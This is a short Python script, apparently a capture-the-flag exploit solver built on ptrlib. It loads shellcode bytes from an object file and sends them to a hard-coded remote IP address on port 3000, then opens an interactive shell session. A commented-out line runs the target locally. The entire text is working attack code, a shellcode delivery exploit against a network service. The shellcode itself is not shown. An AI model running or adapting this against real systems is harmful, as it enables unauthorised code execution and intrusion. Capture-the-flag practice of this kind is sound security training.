from ptrlib import *

with open("shellcode.o", "rb") as f:
    f.seek(0x180)
    shellcode = f.read(0x400)

#sock = Process("./problem")
sock = Socket("49.247.206.172", 3000)

sock.send(shellcode)

sock.interactive()
